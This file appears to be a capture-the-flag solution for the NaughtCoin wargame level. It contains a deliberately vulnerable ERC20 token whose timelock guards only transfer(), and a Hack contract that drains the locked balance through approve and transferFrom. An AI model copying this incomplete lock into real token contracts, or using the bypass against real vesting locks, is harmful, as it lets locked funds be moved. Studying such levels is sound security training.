// SPDX-License-Identifier: MIT

// the goal is to withdraw the tokens before the locked period expires
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
}

// the trick here is that transfer is not the only method to use to withdraw tokens from an address as per the ERC20 specs
// the hack would be to approve a different spender to spend your tokens

contract Hack{
    NaughtCoin public naughtyCoin;
    address myWallet = 0xdB01d94217308046a792D864b16A35837aa52B86;
    constructor(NaughtCoin _address) {
        naughtyCoin = _address;
    }
    function walletBalance() public view returns (uint){
        uint amount = naughtyCoin.balanceOf(myWallet);
        return amount;
    }
    function hackContract() public {
        uint balance = walletBalance();
        naughtyCoin.transferFrom(myWallet, address(this), balance);
    }
    
}